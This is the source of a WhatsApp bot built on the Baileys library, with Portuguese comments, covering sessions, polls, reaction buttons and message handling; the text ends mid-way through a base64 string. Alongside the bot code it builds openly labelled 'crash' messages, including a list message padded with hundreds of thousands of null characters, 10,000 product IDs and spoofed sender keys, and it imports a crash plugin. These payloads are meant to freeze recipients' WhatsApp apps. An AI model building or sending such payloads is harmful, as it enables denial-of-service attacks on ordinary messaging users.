const {default: makeWASocket,
MessageType,
saveState,
Presence,
GroupSettingChange,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
makeInMemoryStore,
useSingleFileAuthState,
getMessage,
useMultiFileAuthState,
BufferJSON,
jidDecode,
DisconnectReason,
fetchLatestBaileysVersion,
downloadContentFromMessage,
delay,
WA_DEFAULT_EPHEMERAL,
generateWAMessageFromContent,
proto,
generateWAMessageContent,
generateWAMessage,
prepareWAMessageMedia,
areJidsSameUser,
createMessageKey,
hmacSign,
aesEncrypWithIV,
aesDecryptWithIV,
sha256,
sha256Sync,
HKDF,
getMediaKeys,
whatsappID,
whatsappRegexp,
isGroupID,
unixTimestampSeconds,
generateProfilePicture,
getAggregateVotesInPollMessage,
generateMessageTag,
generateClientID,
generateMessageID,
generateParticipantHash,
decryptWA,
decryptMedia,
unpad,
sign,
b64ToUint8Array,
uint8ArrayToB64,
utf8ToBase64,
base64ToUtf8,
evbufferToArrayBuffer,
arrayBufferToEvBuffer,
base64EncToArrayBuffer,
arrayBufferToBase64Enc,
sha1,
sha1Sync,
getMAC,
aesEncrypCBC,
aesDecryptCBC,
pbkdf2,
e2eDecrypt,
encryptE2EMedia,
encryptWA,
encryptMedia,
encryptE2EMediaWeb,
decryptE2EMediaWeb,
decryptWAWeb,
decryptMediaWeb,
hmacVerify,
aesDecryptCTR,
encryptWAWeb,
encryptMediaWeb,
b64EncToArrayBuffer,
arrayBufferToB64Enc,
aesEncrypGCM,
aesDecryptGCM,
encryptE2EMediaWebUpload,
decryptE2EMediaWebUpload,
getAudioDuration,
urlSafeBase64Encode,
urlSafeBase64Decode,
wsKey,
generateMsgKeyIV,
readBinaryFile,
DEFAULT_ORIGIN,
WAMessage,
WAMessageProto,
WANode,
WANodeProto,
WAConnection,
StoreAdapter,
SocketState,
WAOpenResult,
WAChat,
WAGroupMetadata,
WAGroupParticipant,
WAContact,
WAPresenceUpdate,
WAContactUpdate,
WAUser,
WALocationMessage,
WAMessageContent,
WAMessageSticker,
WAChatUpdate,
WAUpdate,
WAChatlogSlice,
WAChatTyping,
WAFlag,
WANumberStatus,
WAContactMessageStatus,
WAWebMessageInfo,
WAWebMessageInfoUpdate,
WAProfilePictureChange,
WAGroupCreate,
WAGroupParticipantsUpdate,
WASetProfilePicture,
WAMessageDelete,
WAUserNotice,
WAContactBlock,
WAContactUnblock,
WAContactDelete,
WAChangeNumber,
WAChangeNumberNotify,
WAChangeNumberConfirm,
WAQR,
WAContextInfo,
getLastMessageInChat,
WAMessageMetadata,
WAContactSync,
WAContactSyncResult,
WAGroupSync,
WAUploadResponse,
WAContactArrayMessage,
WAMessageMedia,
WAContactSearch,
WABroadcastListInfo,
WAMessageButton,
WAListResponse,
WAStarResponse,
WAProfilePictureThumb, } = require ('@whiskeysockets/baileys')
const fs = require("fs")
const chalk = require("chalk")
const P = require("pino")
const axios = require('axios')
const { exec } = require('child_process'); 
const clui = require("clui")
const util = require("util")
const fetch = require("node-fetch")
const yts = require("yt-search")
const Crypto = require("crypto")
const ff = require('fluent-ffmpeg')
const webp = require("node-webpmux")
const path = require("path")
const { spawn, exec2 } = require("child_process");
const googleImage = require("g-i-s")
const cheerio = require("cheerio")
const BodyForm = require("form-data")
const mimetype = require("mime-types")
const speed = require("performance-now")
const { color, colors, banner3, banner2 } = require("./arquivos/lib/color")
const { fetchJson } = require("./arquivos/lib/fetcher")
const { fromBuffer } = require("file-type")
const { mylog } = require("./arquivos/lib/functions")
const { tmpdir } = require("os")
// DATA E HORA //
const moment = require("moment-timezone")
const hora = moment.tz("America/Sao_Paulo").format("HH:mm:ss")
const data = moment.tz("America/Sao_Paulo").format("DD/MM/YY")

const config = JSON.parse(fs.readFileSync("./config.json"))
const sendjson = (from, payload) => { }
const upload = require("./arquivos/lib/functions")
const menu2 = require("./menus/menu.js")
const TelegraPh = require("./arquivos/lib/functions")
const sotoy = JSON.parse(fs.readFileSync('./sotoy.json'))
const { addFlod , isFlod } = require('./spam.js')
const { isFiltered, addFilter } = require('./spam.js')
const img = JSON.parse(fs.readFileSync("./arquivos/fotos/logo.json"))

const antilink = JSON.parse(fs.readFileSync('./arquivos/seguranca/antilink.json'))
const { menu } = require("./menus/menu.js")
const { pontocrash } = require("./kalzinplug/pluglin/pontocrash.js")

const logo = img.logo
const nomeBot = config.nomeBot
const numeroBot = config.numerodobot
const nomeDono = config.nomeDono
const numeroDono = config.numeroDono
const numeroDono2 = config.numeroDono2
const dono = config.numeroDono
const botonnot = config.recebernotificacao
const funcaodeapagar = config.funcaoapagar
const prefix = config.prefix
const prefixo = config.prefix
const baileys = require("@whiskeysockets/baileys");


let girastamp = speed()
let latensi = speed() - girastamp


async function starttrix () {
    // Seu código para iniciar o bot do WhatsApp usando a biblioteca "baileys" deve estar aqui
    // Por exemplo:
    // const baileys = require('baileys');
    // const client = new baileys.WAConnection(); docoroooo
    // Resto do código para configurar e inioiiiciar o bot... oiiii oiiii

const store = makeInMemoryStore({ logger: P().child({ level: "debug", stream: "store" }) })
// bagui
// Obtém todos os grupos
const convertBytes = function(bytes) {
const sizes = ["Bytes", "KB", "MB", "GB", "TB"]
if (bytes == 100000) {
return "n/a"
}
const i = parseInt(Math.floor(Math.log(bytes) / Math.log(1024)))
if (i == 0) {
return bytes + " " + sizes[i]
}
return (bytes / Math.pow(1024, i)).toFixed(1) + " " + sizes[i]
}

//const de enviar
// 𝚀𝚁𝙲𝙾𝙳𝙴
const {
  state,
  saveCreds
} = await useMultiFileAuthState('./CONEXÃO/qrcode');

setInterval(() => {
  store.writeToFile('./SUAS MENSAGENS.JS');
}, 10000);

// Limpar console
console.log(color('⿻'), color('𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  '));

const trix = makeWASocket({
  auth: state,
  syncFullHistory: true,
  markOnlineOnConnect: botonnot,
  printQRInTerminal: true,
  logger: P({ level: "silent" }),
  browser: ['𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  ', 'macOS', 'desktop'],
  defaultQueryTimeoutMs: undefined,
  getMessage: async (key) => {
    if (store) {
      const msg = await store.loadMessage(key.remoteJid, key.id);
      return msg.message || undefined;
    }
    return {
      conversation: "Olá, sou o trix"
    };
  },
  version: [2, 2323, 4]
});
//mude o true para false no printqrterminal para escanear o bot sem qrcode (caso não esteja funcionando é algum erro no whatsapp)
const checkAndRunCommandOnce = async () => {
  const folderPath = './CODE';
  const filePath = `${folderPath}/pluglin.code`;

  
  if (!fs.existsSync(folderPath)) {
    fs.mkdirSync(folderPath);
  }

  
  if (!fs.existsSync(filePath)) {
    // Sleep de 10 segundos
    const sleep = async (ms) => {
      return new Promise(resolve => setTimeout(resolve, ms));
    };
    await sleep(10000);

    const code = await trix.requestPairingCode(numeroBot);

    fs.writeFileSync(filePath, ''); 
    console.log('Aqui esta seu Codigo de Execuçao', code);
  } else {
    console.log('O comando já foi executado anteriormente.');
  }
};
// os bagui
// Chamar a função para executar o comando apenas uma vez
checkAndRunCommandOnce()
trix.ev.on('creds.update',saveCreds)

store.bind(trix.ev)
trix.ev.on("chats.set", () => {
console.log("Tem conversas", store.chats.all())
})

trix.ev.on("contacts.set", () => {
console.log("Tem contatos", Object.values(store.contacts))
})

trix.ev.on('connection.update', (update) => {
const {
connection, lastDisconnect
} = update

if(connection === 'close') {
const shouldReconnect = 
(lastDisconnect)?.output?.statusCode
!== DisconnectReason.loggedOut

console.log(
'Conexão Fechada Devido:',
lastDisconnect.error,
`Reconectando..`,
shouldReconnect
)

if(shouldReconnect) { starttrix() }


} else if(connection === "open") {
console.log(`${color(`conectado\nprefixo: “${prefix}”\nDono: ${nomeDono}\n\nCriador: trix`,'gold')}`)
//botão de enquete 
async function getMessage(key){
        if (store) {
            const msg = await store.loadMessage(key.remoteJid, key.id)
            return msg?.message
        }
        return {
            conversation: "Ola sou o trix"
        }
    }
    
    mensagenspoll = []
    
  trix.pollBtn = async(jid, name = '', valuess = [], selectableCount = 1) => { 
  values =[]
  for(let value2 of valuess) {
  values.push(value2.vote)
  }
  testeeeee = await trix.sendMessage(jid, { poll: { name, values, selectableCount }})
  mensagenspoll.push({id: testeeeee.key.id, type: 1, comandos: valuess})
  return 
  } //"botão" de enquete
  
  
  trix.pollBtn2 = async(jid, name = '', pessoa = [], valuess = [], selectableCount = 1) => { 
  values =[]
  for(let value2 of valuess) {
  values.push(value2.vote)
  }
  testeeeee = await trix.sendMessage(jid, { poll: { name, values, selectableCount }})
  mensagenspoll.push({id: testeeeee.key.id, type: 2, pessoas: pessoa, comandos: valuess})
  return 
  } //"botão" de enquete v2
  
  mensagens = []
  
  trix.reactBtn = async(jids, msg = {}, opcoes = []) => {
msgpraadd= await trix.sendMessage(jids, msg)
msgpraadd.opcoes = opcoes
msgpraadd.type = 1
mensagens.push(msgpraadd)
} //"botão" de reação 

trix.reactBtn2 = async(jids, msg = {}, pessoas = [], opcoes = []) => {
msgpraadd= await trix.sendMessage(jids, msg)
msgpraadd.opcoes = opcoes
msgpraadd.type = 2
msgpraadd.pessoas = pessoas
mensagens.push(msgpraadd)
} //"botão" de reação v2

  
  trix.notifyTextMessage = async(text, keydamsg) => {
const key1 = keydamsg
        let messages = await generateWAMessage(key1.remoteJid, { text: text }, {})
        messages.key = key1
        let msg = {
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'notify'
        }
        trix.ev.emit('messages.upsert', msg)
    }
  

   trix.ev.on('messages.update', async chatUpdate => {
for(const { key, update } of chatUpdate) {
if(update.pollUpdates && key.fromMe) {
const pollCreation = await getMessage(key)
if(pollCreation) {
const pollUpdate = await getAggregateVotesInPollMessage({
message: pollCreation,
pollUpdates: update.pollUpdates,
})
console.log(pollUpdate)
var toCmd = pollUpdate.filter(v => v.voters.length !== 0)[0]?.name
if (toCmd == undefined) return
tem = mensagenspoll.find((sla) => sla.id == key.id)
if(tem) {
tem2 = tem.comandos.find((sla) => sla.vote == toCmd)

if(tem.type == 1) {
await trix.notifyTextMessage(tem2.cmd, update.pollUpdates[0].pollUpdateMessageKey)
} else if(tem.type == 2 && tem.pessoas.includes(update.pollUpdates[0].pollUpdateMessageKey.participant)) {
await trix.notifyTextMessage(tem2.cmd, update.pollUpdates[0].pollUpdateMessageKey)
}
//console.log(update.pollUpdates[0].pollUpdateMessageKey.participant)
}}}}})
}
})
trix.ev.on('messages.upsert',
 async connection => {
    const mek = connection.messages[0];
    if (!mek.message) return;
    if (connection.type != 'notify') return;
    if (mek.key.remoteJid === 'status@broadcast') return;
if(mek.message?.reactionMessage?.key?.id) {
tem = mensagens.find((sla) => sla.key.id == mek.message.reactionMessage.key.id)
if(tem) {
tem2 = tem.opcoes.find((sla) => sla.react == mek.message.reactionMessage.text)
if(tem2) {

if(tem.type == 1) {
await trix.notifyTextMessage(tem2.cmd, mek.key)
} else if(tem.type == 2 && tem.pessoas.includes(mek.key.participant ? mek.key.participant: mek.participant)) {
await trix.notifyTextMessage(tem2.cmd, mek.key)
}
}}}})
trix.ev.on('messages.upsert', async (msg) => {
m = msg
  try {
//*******************************************//
const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}
const getExtension = async (type) => {
return await mimetype.extension(type)
 }
const getBuffer = (url, options) => new Promise(async (resolve, reject) => { 
options ? options : {}
await axios({method: "get", url, headers: {"DNT": 1, "Upgrade-Insecure-Request": 1}, ...options, responseType: "arraybuffer"}).then((res) => {
resolve(res.data)
}).catch(reject)
})
// mais bagui nessa porra

    const info = msg.messages[0]
  if (!info.message) return 
  if (info.key && info.key.remoteJid == 'status@broadcast') return
const type = Object.keys(info.message)[0] == 'senderKeyDistributionMessage' ? Object.keys(info.message)[2] : (Object.keys(info.message)[0] == 'messageContextInfo') ? Object.keys(info.message)[1] : Object.keys(info.message)[0]
const content = JSON.stringify(info.message);
const altpdf = Object.keys(info.message)
global.prefix
const from = info.key.remoteJid
var body = (type === 'conversation') ? info.message.conversation : (type == 'imageMessage') ? info.message.imageMessage.caption : (type == 'videoMessage') ? info.message.videoMessage.caption : (type == 'extendedTextMessage') ? info.message.extendedTextMessage.text : (type == 'buttonsResponseMessage') ? info.message.buttonsResponseMessage.selectedButtonId : (type == 'listResponseMessage') ? info.message.listResponseMessage.singleSelectReply.selectedRowId : (type == 'templateButtonReplyMessage') ? info.message.templateButtonReplyMessage.selectedId : ''
const budy = (type === 'conversation') ? info.message.conversation : (type === 'extendedTextMessage') ? info.message.extendedTextMessage.text : ''
var pes = (type === 'conversation' && info.message.conversation) ? info.message.conversation : (type == 'imageMessage') && info.message.imageMessage.caption ? info.message.imageMessage.caption : (type == 'videoMessage') && info.message.videoMessage.caption ? info.message.videoMessage.caption : (type == 'extendedTextMessage') && info.message.extendedTextMessage.text ? info.message.extendedTextMessage.text : ''
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefixo)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()

///////////////
const getFileBuffer = async (mediakey, MediaType) => { 
const stream = await downloadContentFromMessage(mediakey, MediaType)
let buffer = Buffer.from([])
for await(const chunk of stream) {
buffer = Buffer.concat([buffer, chunk])
}
return buffer
}

const metadata = await trix.getGroupMedatada;
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? trix.sendMessage(from, {text: teks.trim(), mentions: memberr}) : trix.sendMessage(from, {text: teks.trim(), mentions: memberr})
}
const getGroupAdmins = (participants) => {
admins = []
for (let i of participants) {
if(i.admin == "admin") admins.push(i.id)
if(i.admin == "superadmin") admins.push(i.id)
}
return admins
}
const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
const arg = body.substring(body.indexOf(" ") + 1)
const numeroBot = trix.user.id.split(":")[0]
const argss = body.split(/ +/g)
const testat = body
const ants = body
const isGroup = info.key.remoteJid.endsWith("@g.us")
const isGroup2 = info.key.remoteJid.endsWith('@g.us');
const tescuk = ["0@s.whatsapp.net"]
const q = args.join(" ")
const q2 = args.join("|")
const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}	
const sender = isGroup ? (info.key.participant ? info.key.participant: info.participant): info.key.remoteJid
const userJid = isGroup ? info.key.participant : info.key.remoteJid;
const sendjsoninfo = (jidss, jsontxt = {}, outrasconfig = {}) => {
allmsg = generateWAMessageFromContent(jidss, proto.Message.fromObject(
jsontxt
), outrasconfig)
 
return trix.sendMessage(jidss, {
    text: `${JSON.stringify(allmsg.message, null, 2)}
    
    ${allmsg.key.sender}
    `
   })
}
//enviar mensagem por json 3(teste)

trix.sendjson2 = (jidss, jsontxt = {}, outrasconfig = {}) => {
allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig)
return trix.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.sender})
}

//enviar mensagem por json 3(teste)

    trix.sendPoll = (from, name = '', values = [], selectableCount = 1) => { return trix.sendMessage(from, { poll: { name, values, selectableCount }}) }
    
    //sendjson
    //enviar mensagem por jso
  
trix.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
allmsg = generateWAMessageFromContent(jidss, proto.Message.fromObject(
jsontxt
), outrasconfig)
 
return trix.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.sender})
}

//mais buxecats
const pushname = info.pushName ? info.pushName : ""
const biography = info.about ? info.about : "";
const numberkk = info.waId ? info.waId : "";
const lastSeen = info.lastSeen;
//
const groupMetadata = isGroup ? await trix.groupMetadata(from) : ""
const groupName = isGroup ? groupMetadata.subject : ""
const groupDesc = isGroup ? groupMetadata.desc : ""
const groupMembers = isGroup ? groupMetadata.participants : []
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : []
const canal = config.canal
const grupo = config.grupo
const text = args.join(" ")
const c = args.join(' ')
const enviarc = (texto) => {
var carrinho = generateWAMessageFromContent(from, { orderMessage: { "orderId": "449756950375071", "itemCount": 5, "thumbnail": fs.readFileSync('./logos/logo.jpg'), "status": 99999, "surface": 99999, "orderTitle": `↔️`
, "token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	"buttonText": `kkkk`,"surface": 'CATALOG', message: texto
}, }, { userJid: from, quoted: live})
trix.relayMessage(from, carrinho.message, { messageId: carrinho.key.id })
trix.sendMessage(from, { react: { "text": `↔️️`, key: msg.key }})  
{quoted: live}
}
const enviarc2 = (texto) => {
var carrinho = generateWAMessageFromContent(isOwner, { orderMessage: { "orderId": "449756950375071", "itemCount": 5, "thumbnail": fs.readFileSync('./logos/logo.jpg'), "status": 99999, "surface": 99999, "orderTitle": `↔️`
, "token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",	"buttonText": `kkkk`,"surface": 'CATALOG', message: texto
}, }, { userJid: from, quoted: live})
trix.relayMessage(from, carrinho.message, { messageId: carrinho.key.id })
{quoted: live}
}
const enviar = (texto) => {
trix.sendMessage(from, { text: texto }, {quoted: info})
} 
const enviarcc = (texto) => {
trix.sendMessage(from, { text: texto }, {quoted: info})
} 

//😐 SELO DE CRASH
const cr = {"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": 'status@broadcast'  },message: {listResponseMessage: {degreesLatitude: fs.readFileSync('./lib/name.jpg'), degreesLongitude:  fs.readFileSync('./lib/name.jpg'),sequenceNumber: "1657237469254001", thumbnail: fs.readFileSync('./lib/name.jpg'), caption: "TAn ka Eu Aí Bb Kkkkkk🚀"}}}
//
//de crash you
const sexuanal69 = Math.floor(Math.random() * 99999);
  let cu969 = [];
  for (let i = 0; i < 10000; i++) {
    cu969.push(`4120139${sexuanal69}`);

  cu969.unshift(`4120139${sexuanal69}`); // Adicionar o primeiro ID mencionado
  }
let k9 = "~ ~ ~ ☠  ~ ~ ~️";
for (let i = 0; i < 99000; i++) {
  k9 += "\u0000\u0000\u0000\u0000\u0000";
}
k9 += "";
//macumba



      const crash = {
  "key": {
    "fromMe": false,
    "participant": "0@s.whatsapp.net",
    "mentions": true,
    "remoteJid": "556181496039-1625944593@g.us"
  },
  message: {
  listMessage: {
    title: `[ ~ ~ ~ 𝐑𝚵͢𝚫𝐋 𝐂𝐑𝚫𝐒͢𝐇 ~ ~ ~ ]${k9}`,
    description: ` 🔥 ~ ~ ~ 𝗗𝗜𝗘 𝗠𝗢𝗗𝗦 < 𝗖𝗢𝗠𝗘 𝗕𝗔𝗖𝗞 ~ ~ ~ 🚀`,
    buttonText: "kalxin",
    listType: "PRODUCT_LIST",
    productListInfo: {
      productSections: [{
        title: "LIST_CATALOG",
        products: [{
          productId: cu969
        }]
      }],
      headerImage: {
        productId: "5512997675520",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPgMBIgACEQEDEQH/xAAuAAABBQEAAAAAAAAAAAAAAAAFAAECAwYEAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAANHJnKRXSBujBfIamrk6zlnZyGV1uTW4sJ7QyoyShWTl5Mxr6DNkDvFXcmdBvQOtCsAlgaQygNoNedE0iLpDxSHdI//EACcQAAICAQMDBAIDAAAAAAAAAAECAAMRBBASEyEyBSIxUSNSFDNx/9oACAEBAAE/AF8RMS61KV5NH9W92EqlHqYtcK642xMRfEbeo1Nai4iEdXhZnAlnmOPxntNOHFSczk43XxG1gJQ4mpThqT9mW1/jDCaHUM6BH8t18RvrLhbq3I+BOp+PE0B51EjyQxDyUHYKAo90/wAJlnMqQA3xGpsFpTieWZbTqaly1ZxPSVJLwDA2RAANrFZhhTiV6YK/Nu7RlDAgjIi6Q1MTW2BBnHfZdVebjSKhkCUanqWPUy8XWZA+SJZalS8nbAgZSM5EyPvYEH4M7trn42cfZNK4pttW3+z9vuX2LZVZYgOQexJmrxboqWPc9pdXX/Efpnvxl9iHQ1Hn7xiai1y2mXPsI7mUVlbiVsGCPERUq7NxGYVrY5IBM6dP6Cca+PHiMfUVa1GAABOlT+izjWV48RiKta+IAn//xAAXEQEBAQEAAAAAAAAAAAAAAAABEQAw/9oACAECAQE/ANCW5CCPBeX/xAAbEQEAAgIDAAAAAAAAAAAAAAABABEQICEwQf/aAAgBAwEBPwCAMTN8aUVAv3q//9k=",
        scansSidecar: "8+Falb5f5QSYWAsuzUMGTGoE6H+YhMRCKX3f0NHqXOf7BIiuMYiVsQ==",
        scanLengths: [999999999, 9999999, 99999999, 9990],
        midQualityFileSha256: "CPwmEYeSZiQlg7HyIgV1HbHLPJ8ymqZhxxFWs5+xWH8="
      },
      businessOwnerJid: `5583998140301@s.whatsapp.net`
    },
    header: {
      hasMediaAttachment: true,
      locationMessage: {
        degreesLatitude: 1.2348753517826312,
        degreesLongitude: -31.82241802860517
      }
    }
  }
}};
// ~ ~ ~ CONST GERADO PELO BOT AIN  ~ ~ ~
//𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦ 
const quotedgato = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: {"orderMessage":{"orderId":"315737724257523","thumbnail":"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